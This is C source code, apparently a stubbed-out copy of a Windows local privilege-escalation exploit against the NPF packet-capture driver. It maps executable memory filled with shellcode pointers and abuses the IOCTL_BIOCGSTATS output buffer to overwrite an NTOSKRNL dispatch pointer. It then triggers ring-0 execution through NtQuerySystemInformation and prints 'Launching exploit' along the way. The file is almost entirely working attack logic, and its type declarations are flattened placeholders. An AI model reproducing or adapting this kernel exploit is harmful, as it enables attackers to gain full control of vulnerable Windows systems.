
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int QueryBuffer ;
typedef int (* PQUERYSYSTEM ) (int,int *,int,int *) ;
typedef char* LPVOID ;
typedef int LPBYTE ;
typedef int HANDLE ;
typedef int DWORD ;
typedef int BYTE ;


 int CreateFileA (char*,int,int ,int ,int ,int ,int *) ;
 scalar_t__ DeviceIoControl (int ,int ,char*,int ,char*,int ,int*,int *) ;
 int GENERIC_READ ;
 int GENERIC_WRITE ;
 int GetModuleHandleA (char*) ;
 scalar_t__ GetNpfDevice (char*) ;
 char* GetNtosBase () ;
 int GetNtosDelta () ;
 scalar_t__ GetProcAddress (int ,char*) ;
 int INVALID_HANDLE_VALUE ;
 int IOCTL_BIOCGSTATS ;
 int MEM_COMMIT ;
 int MEM_RESERVE ;
 int OPEN_EXISTING ;
 int OUT_SIZE ;
 int PAGE_EXECUTE_READWRITE ;
 char* ShellCode ;
 char* VirtualAlloc (char*,int,int,int ) ;
 char* g_PatchAddress ;
 int printf (char*,...) ;

int main(int argc, char **argv)
{
 HANDLE hDevice;
 LPVOID lpNtosSwitch;
 DWORD cb, delta;
 DWORD values[4];
 LPVOID lpFakeTable;
 PQUERYSYSTEM NtQuerySystemInformation;
 char szNpfDevice[100];
 BYTE QueryBuffer[0x24];
 int i;

 NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress(GetModuleHandleA("NTDLL.DLL"),"NtQuerySystemInformation");

 printf ("Searching for a valid Interface ...\n");

 if ( GetNpfDevice(szNpfDevice) )
 {
  printf("NPF Device name generated! : %s\n",szNpfDevice);
 }

 else
 {
  printf("Cannot found any valid Interface!\n");
  return 0;
 }

 if ( lpFakeTable = VirtualAlloc((LPVOID)0x570000,
         0x20000,
         MEM_COMMIT|MEM_RESERVE,
         PAGE_EXECUTE_READWRITE) )
 {
  printf("Memory allocated at %p\n",lpFakeTable);

  for ( i=0; i < ( 0x20000/sizeof(LPVOID) ); i++)
  {
   * ( (LPVOID *)lpFakeTable + i) = ShellCode;
  }

  printf("Memory mapping filled! ... \n");

 }

 else
 {
  printf("Cannot allocate memory!\n");
  return 0;
 }

 if ( (hDevice = CreateFileA(szNpfDevice,
    GENERIC_READ|GENERIC_WRITE,
    0,
    0,
    OPEN_EXISTING,
    0,
    ((void*)0)) ) != INVALID_HANDLE_VALUE )
 {
  printf("Device %s succesfully opened!\n", szNpfDevice);

  if ( (lpNtosSwitch = GetNtosBase()) && ( delta = GetNtosDelta()) )
  {
   g_PatchAddress = (LPVOID) ((LPBYTE) lpNtosSwitch + delta );

   if ( DeviceIoControl(hDevice,
        IOCTL_BIOCGSTATS,
        (LPVOID)0,0,
        (LPVOID)values,OUT_SIZE,
        &cb,
        ((void*)0)) )
   {
    printf("First time reading ... bytes returned %#x\n",cb);

    for (i = 0;i<4;i++)
    {
     printf ("OutBuffer[i] = %#x\n",values[i]);
    }
   }

   printf("Launching exploit ... \nOverwritting NTOSKRNL switch at -> %#p\n",g_PatchAddress);


   if ( DeviceIoControl(hDevice,
         IOCTL_BIOCGSTATS,
        (LPVOID)0,0,
        (LPVOID)g_PatchAddress,OUT_SIZE,
        &cb,
        ((void*)0)) )

   {

    NtQuerySystemInformation(0x15,QueryBuffer,sizeof(QueryBuffer), ((void*)0));

    printf("We are back from ring0!\n");
   }
  }
 }

 else
 {
  printf("Error: Cannot open device %s\n",szNpfDevice);
 }
}
